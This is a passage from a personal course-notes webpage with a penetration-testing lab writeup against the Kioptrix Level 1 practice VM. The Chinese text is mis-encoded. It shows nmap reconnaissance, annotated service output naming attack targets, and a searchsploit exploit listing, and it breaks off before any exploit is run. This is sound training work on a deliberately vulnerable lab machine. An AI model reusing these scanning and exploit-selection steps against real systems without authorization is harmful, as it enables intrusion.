
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../lab01/">
      
      
        <link rel="next" href="../lab03/">
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
    
    
      
        <title>Lab02 - CSNote</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.e53b48f4.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../stylesheets/extra.css">
    
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.css">
    
      <link rel="stylesheet" href="https://fonts.loli.net/css?family=JetBrains Mono:400,500,600,700&display=swap">
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css">
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#lab02-writeup" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="CSNote" class="md-header__button md-logo" aria-label="CSNote" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            CSNote
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Lab02
            
          </span>
        </div>
      </div>
    </div>
    
      
    
    
    
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="CSNote" class="md-nav__button md-logo" aria-label="CSNote" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    CSNote
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    index
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    OI-learning
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            OI-learning
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OI-Learning/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    intro
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OI-Learning/C%2B%2B%20OOP/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    C++ é¢å‘å¯¹è±¡
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Algorithm
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            Algorithm
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OI-Learning/Algorithm/STL_algorithm/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    STL ç®—æ³•åº“ ref
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OI-Learning/Algorithm/fastpow/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    å¿«é€Ÿå¹‚
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
        
          
          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Data Structure
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4">
            <span class="md-nav__icon md-icon"></span>
            Data Structure
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OI-Learning/Data-Structure/linkedlist/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    é“¾è¡¨
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OI-Learning/Data-Structure/vector/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    STL vector ref
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OI-Learning/Data-Structure/stack/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    æ ˆ && å•è°ƒæ ˆ
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OI-Learning/Data-Structure/queue/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    é˜Ÿåˆ— && å•è°ƒé˜Ÿåˆ—
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OI-Learning/Data-Structure/hashmap/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    å“ˆå¸Œè¡¨
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Course Notes
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Course Notes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
        
          
          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    ICSPA x86 note
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1">
            <span class="md-nav__icon md-icon"></span>
            ICSPA x86 note
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ICSPA-x86/PA0/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PA0
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ICSPA-x86/PA1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PA1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ICSPA-x86/PA2-1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PA2-1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ICSPA-x86/i386/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    i386 æŒ‡ä»¤ç»“æ„ for PA2-1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ICSPA-x86/PA2-2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PA2-2
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
        
          
          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    ç½‘ç»œæ”»é˜²å®æˆ˜ note
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3_2">
            <span class="md-nav__icon md-icon"></span>
            ç½‘ç»œæ”»é˜²å®æˆ˜ note
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../lab01/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Lab01
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Lab02
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Lab02
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    <span class="md-ellipsis">
      æ¸—é€ç›®çš„
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    <span class="md-ellipsis">
      å…·ä½“æ“ä½œ
    </span>
  </a>
  
    <nav class="md-nav" aria-label="å…·ä½“æ“ä½œ">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    <span class="md-ellipsis">
      ä¿¡æ¯æ”¶é›†
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web" class="md-nav__link">
    <span class="md-ellipsis">
      Web æ–¹å‘æ”»å‡»
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#samba" class="md-nav__link">
    <span class="md-ellipsis">
      Samba æ–¹å‘æ”»å‡»
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    <span class="md-ellipsis">
      æ¸—é€ç»“æœ
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    <span class="md-ellipsis">
      é—®é¢˜åˆ†æ
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    <span class="md-ellipsis">
      å…¶ä»–
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../lab03/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Lab03
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../lab04/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Lab04
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../lab05/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Lab05
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
        
          
          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    ICS && CSAPP Labs
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_3">
            <span class="md-nav__icon md-icon"></span>
            ICS && CSAPP Labs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ICS%26%26CSAPP-Lab/intro/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    intro
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ICS%26%26CSAPP-Lab/Datalab/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CSAPP Datalab
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ICS%26%26CSAPP-Lab/Bomblab/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CSAPP Bomblab
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ICS%26%26CSAPP-Lab/Binalab/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ICS Binalab
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Deep Learning
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Deep Learning
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Deep-Learning/intro/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    intro
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    <span class="md-ellipsis">
      æ¸—é€ç›®çš„
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    <span class="md-ellipsis">
      å…·ä½“æ“ä½œ
    </span>
  </a>
  
    <nav class="md-nav" aria-label="å…·ä½“æ“ä½œ">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    <span class="md-ellipsis">
      ä¿¡æ¯æ”¶é›†
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web" class="md-nav__link">
    <span class="md-ellipsis">
      Web æ–¹å‘æ”»å‡»
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#samba" class="md-nav__link">
    <span class="md-ellipsis">
      Samba æ–¹å‘æ”»å‡»
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    <span class="md-ellipsis">
      æ¸—é€ç»“æœ
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    <span class="md-ellipsis">
      é—®é¢˜åˆ†æ
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    <span class="md-ellipsis">
      å…¶ä»–
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



<h1 id="lab02-writeup">ç½‘ç»œæ”»é˜²å®æˆ˜ Lab02 Writeup</h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p>âœ 715 words  | ğŸ› 241 codelines  | â° 5 min read | Enjoy ğŸ¶</p>
</div>
<div class="admonition quote">
<p class="admonition-title">ä½¿ç”¨çš„é¶æœºä¸º VulnHub Kioptix Level 1</p>
</div>
<h2 id="_1">æ¸—é€ç›®çš„</h2>
<p>å–å¾—ç›®æ ‡é¶æœºçš„ root æƒé™</p>
<p>å­¦ä¹  <code>nmap</code> ç­‰æŒ‡ä»¤çš„ç”¨æ³•ï¼Œäº†è§£ç½‘ç»œæ¸—é€çš„åŸºæœ¬æµç¨‹</p>
<h2 id="_2">å…·ä½“æ“ä½œ</h2>
<h3 id="_3">ä¿¡æ¯æ”¶é›†</h3>
<p>å¯åŠ¨ VirtualBox ä¸­çš„ Kali æ”»å‡»æœºï¼ˆç”¨äºè¿›è¡Œæ¸—é€æ”»å‡»ï¼‰ä¸ Kioptix é¶æœºï¼Œç½‘ç»œé‡‡ç”¨ NAT è¿æ¥</p>
<p>é¦–å…ˆ <code>ifconfig</code> è·å–æ”»å‡»æœºçš„ ip ä¸º <code>10.0.2.3</code>ï¼Œä½¿ç”¨ <code>nmap</code> æ‰«æ ipï¼š</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; nmap -sn 10.0.2.0/24
Starting Nmap 7.95 at 2025-10-12 05:57 CST
Nmap scan report for bogon (10.0.2.1)
Host is up (0.00076s latency).
MAC Address: 52:55:0A:00:02:01 (Unknown)
Nmap scan report for bogon (10.0.2.2)
Host is up (0.00038s latency).
MAC Address: 08:00:27:D8:A8:AA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for bogon (10.0.2.7)
Host is up (0.0011s latency).
MAC Address: 08:00:27:F3:A8:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for bogon (10.0.2.3)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.04 seconds
</code></pre></div></td></tr></table></div>
<p>è€ƒè™‘é¶æœº ip ä¸º <code>10.0.2.7</code>ï¼Œç»§ç»­æ‰«æç«¯å£ <code>nmap -sV -sC 10.0.2.7</code>ï¼Œçœ‹çœ‹æœ‰å“ªäº›æœåŠ¡é¡¹</p>
<p>ä»¥ä¸‹æ˜¯å…³é”®çš„èŠ‚é€‰å†…å®¹ï¼Œæ¯ä¸ªæœåŠ¡éƒ½ä¼šæœ‰ç›¸åº”çš„æ³¨é‡Šè¯´æ˜</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span></pre></div></td><td class="code"><div><pre><span></span><code>// SSH æœåŠ¡ï¼Œæ”¯æŒ SSHv1
// OpenSSH 2.9p2 çš„å‘å¸ƒæ—¥æœŸä¸º 2000 å¹´ 12 æœˆï¼Œéå¸¸å¤è€
// å¯èƒ½å­˜åœ¨æ¼æ´
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1

// HTTP æœåŠ¡ï¼Œä½¿ç”¨ Apache 1.3.20ï¼Œå…¶å‘å¸ƒæ—¥æœŸ 2001 å¹´ 7 æœˆï¼Œéå¸¸å¤è€
// å¯ç”¨äº† TRACE æ–¹æ³•
// ä¼˜å…ˆæ”»å‡»
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| http-methods: 
|_  Potentially risky methods: TRACE

// RPC æœåŠ¡
// ä¸è€ƒè™‘ä½œä¸ºæ”»å‡»ç›®æ ‡
PORT      STATE SERVICE     VERSION
111/tcp   open  rpcbind     2 (RPC #100000)

// Samba æœåŠ¡ï¼Œç”¨äºå…±äº«æ–‡ä»¶ï¼Œç‰ˆæœ¬æœªçŸ¥
// ä¼˜å…ˆæ”»å‡»
PORT      STATE SERVICE     VERSION
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)

// HTTPS æœåŠ¡ï¼Œå¤§è‡´å†…å®¹åŒ HTTP
// ä¼˜å…ˆæ”»å‡»
PORT      STATE SERVICE     VERSION
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b

// RPC æœåŠ¡
// ä¸è€ƒè™‘ä½œä¸ºæ”»å‡»ç›®æ ‡
PORT      STATE SERVICE     VERSION
32768/tcp open  status      1 (RPC #100024)
</code></pre></div></td></tr></table></div>
<p>åŒæ—¶ç¡®å®šé¶æœºæ“ä½œç³»ç»Ÿä¸º<code>RedHat Linux</code></p>
<h3 id="web">Web æ–¹å‘æ”»å‡»</h3>
<p>æ³¨æ„åˆ°ä»¥ä¸‹æœåŠ¡ï¼š</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code>Apache/1.3.20
mod_ssl/2.8.4
OpenSSL/0.9.6b
</code></pre></div></td></tr></table></div>
<p>å°è¯•ç”¨ <code>searchsploit</code> è¿›è¡Œæ¼æ´å¯»æ‰¾ï¼š</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; searchsploit apache 1.3.20 
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
Apache + PHP &lt; 5.3.12 / &lt; 5.4.2 - cgi-bin  | php/remote/29290.c
Apache + PHP &lt; 5.3.12 / &lt; 5.4.2 - Remote C | php/remote/29316.py
Apache 1.3.20 (Win32) - &#39;PHP.exe&#39; Remote F | windows/remote/21204.txt
Apache 1.3.6/1.3.9/1.3.11/1.3.12/1.3.20 -  | windows/remote/19975.pl
Apache 1.3.x &lt; 2.0.48 mod_userdir - Remote | linux/remote/132.c
Apache &lt; 1.3.37/2.0.59/2.2.3 mod_rewrite - | multiple/remote/2237.sh
Apache &lt; 2.0.64 / &lt; 2.2.21 mod_setenvif -  | linux/dos/41769.txt
Apache &lt; 2.2.34 / &lt; 2.4.27 - OPTIONS Memor | linux/webapps/42745.py
Apache CouchDB &lt; 2.1.0 - Remote Code Execu | linux/webapps/44913.py
Apache CXF &lt; 2.5.10/2.6.7/2.7.4 - Denial o | multiple/dos/26710.txt
Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuck | unix/remote/21671.c
Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuck | unix/remote/47080.c
Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuck | unix/remote/764.c
Apache Struts &lt; 1.3.10 / &lt; 2.3.16.2 - Clas | multiple/remote/41690.rb
Apache Struts &lt; 2.2.0 - Remote Command Exe | multiple/remote/17691.rb
Apache Tika-server &lt; 1.18 - Command Inject | windows/remote/46540.py
Apache Tomcat &lt; 5.5.17 - Remote Directory  | multiple/remote/2061.txt
Apache Tomcat &lt; 6.0.18 - &#39;utf8&#39; Directory  | multiple/remote/6229.txt
Apache Tomcat &lt; 6.0.18 - &#39;utf8&#39; Directory  | unix/remote/14489.c
Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 /  | jsp/webapps/42966.py
Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 /  | windows/webapps/42953.txt
